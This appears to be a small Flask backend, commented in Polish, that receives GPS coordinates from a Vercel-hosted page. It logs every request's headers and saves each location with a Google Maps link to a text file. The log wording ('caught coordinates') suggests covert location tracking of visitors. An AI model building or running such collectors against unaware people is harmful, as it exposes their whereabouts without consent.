from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime
import sys

app = Flask(__name__)
CORS(app)  # Włączamy CORS dla wszystkich ścieżek i domen, żeby przeglądarka nie blokowała strzałów z Vercela

@app.route('/')
def home():
    print("HOME HIT", file=sys.stderr)
    sys.stderr.flush()
    return "Server is running!", 200

@app.route('/zapisz', methods=['GET', 'POST', 'OPTIONS'])
def zapisz():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    print(f"--- NOWE ZAPYTANIE --- args={request.args}, headers={dict(request.headers)}", file=sys.stderr)
    sys.stderr.flush()
    
    if lat and lon:
        czas = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        wpis = f"[{czas}] Lat: {lat}, Lon: {lon} | Maps: https://maps.google.com/?q={lat},{lon}\n"
        print(f"ZLAPANO WSPOLRZEDNE: {wpis}", file=sys.stderr)
        sys.stderr.flush()
        
        with open('wspolrzedne.txt', 'a', encoding='utf-8') as f:
            f.write(wpis)
            
        return jsonify({"status": "success", "lat": lat, "lon": lon}), 200
    
    print("BLAD: Brak wspolrzednych w rzadaniu", file=sys.stderr)
    sys.stderr.flush()
    return jsonify({"status": "error", "message": "Brak wspolrzednych"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
